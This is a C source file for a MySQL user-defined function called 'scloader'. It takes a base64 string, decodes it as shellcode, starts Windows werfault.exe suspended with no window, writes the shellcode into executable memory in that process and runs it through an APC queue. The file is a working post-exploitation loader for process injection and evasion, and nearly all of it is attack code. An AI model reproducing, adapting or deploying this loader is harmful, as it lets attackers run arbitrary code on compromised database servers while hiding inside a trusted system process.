#include <mysql.h>
#include<stdlib.h>
#include <string.h>



// base64 decode, just stolen from internet
static const unsigned char base64_suffix_map[256] = {
    255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 253, 255,
    255, 253, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255,
    255, 255, 255, 255, 255, 255, 255, 255, 253, 255, 255, 255,
    255, 255, 255, 255, 255, 255, 255,  62, 255, 255, 255,  63,
    52,  53,  54,  55,  56,  57,  58,  59,  60,  61, 255, 255,
    255, 254, 255, 255, 255,   0,   1,   2,   3,   4,   5,   6,
    7,   8,   9,  10,  11,  12,  13,  14,  15,  16,  17,  18,
    19,  20,  21,  22,  23,  24,  25, 255, 255, 255, 255, 255,
    255,  26,  27,  28,  29,  30,  31,  32,  33,  34,  35,  36,
    37,  38,  39,  40,  41,  42,  43,  44,  45,  46,  47,  48,
    49,  50,  51, 255, 255, 255, 255, 255, 255, 255, 255, 255,
    255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255,
    255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255,
    255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255,
    255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255,
    255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255,
    255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255,
    255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255,
    255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255,
    255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255,
    255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255,
    255, 255, 255, 255 };
int base64_decode(const char *indata, int inlen, unsigned char *outdata, int *outlen) {
    
    int ret = 0;
    if (indata == NULL || inlen <= 0 || outdata == NULL || outlen == NULL) {
        return ret = -1;
    }
    if (inlen % 4 != 0) { // 需要解码的数据不是4字节倍数
        return ret = -2;
    }
    
    int t = 0, x = 0, y = 0, i = 0;
    unsigned char c = 0;
    int g = 3;
    
    while (indata[x] != 0) {
        // 需要解码的数据对应的ASCII值对应base64_suffix_map的值
        c = base64_suffix_map[indata[x++]];
        if (c == 255) return -1;// 对应的值不在转码表中
        if (c == 253) continue;// 对应的值是换行或者回车
        if (c == 254) { c = 0; g--; }// 对应的值是'='
        t = (t<<6) | c; // 将其依次放入一个int型中占3字节
        if (++y == 4) {
            outdata[i++] = (unsigned char)((t>>16)&0xff);
            if (g > 1) outdata[i++] = (unsigned char)((t>>8)&0xff);
            if (g > 2) outdata[i++] = (unsigned char)(t&0xff);
            y = t = 0;
        }
    }
    if (outlen != NULL) {
        *outlen = i;
    }
    return ret;
}


my_bool scloader_init(
	UDF_INIT *initid
,	UDF_ARGS *args
,	char *message
){
	unsigned int i=0;
	if(args->arg_count == 1
	&& args->arg_type[i]==STRING_RESULT){
		return 0;
	} else {
		strcpy(
			message
		,	"Expected exactly one string type parameter"
		);		
		return 1;
	}
}


void scloader_deinit(
	UDF_INIT *initid
){
}


char* scloader(
	UDF_INIT *initid
,	UDF_ARGS *args
,	char* result
,	unsigned long* length
,	char *is_null
,	char *error
){
	// base64 decode shellcode
    int len = 0;
    unsigned char buf[1500] = {0};
    base64_decode(args->args[0], (int)strlen(args->args[0]), buf, &len);

	STARTUPINFO si;
    PROCESS_INFORMATION pi;
    LPVOID mem;
    SIZE_T buf_size = sizeof(buf);
    HANDLE hProcess, hThread;
    
    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));

    LPCWSTR bin;
    #ifdef _WIN64
        bin = "C:\\windows\\system32\\werfault.exe";
    #else 
        bin = "C:\\windows\\syswow64\\werfault.exe";
    #endif

    if(!CreateProcessA(bin, NULL, NULL, NULL, FALSE, CREATE_NO_WINDOW|CREATE_SUSPENDED, NULL, NULL, &si, &pi))
    {
            DWORD errval = GetLastError();
            result = malloc(10);
            _ultoa(errval, result, 16);
            if (!(*result) || result == NULL) {
                *is_null = 1;
            } else {
                *length = strlen(result);
            }
            return result;
    }
    
	WaitForSingleObject(pi.hProcess, 2000);
	hProcess = pi.hProcess;
	hThread = pi.hThread;


	mem = VirtualAllocEx(hProcess, NULL, buf_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	WriteProcessMemory(hProcess, mem, buf, buf_size, 0);
	QueueUserAPC((PAPCFUNC)mem, hThread, NULL);
	ResumeThread(hThread);
    result = "ok";

    if (!(*result) || result == NULL) {
		*is_null = 1;
	} else {
		*length = strlen(result);
	}

    return result;
}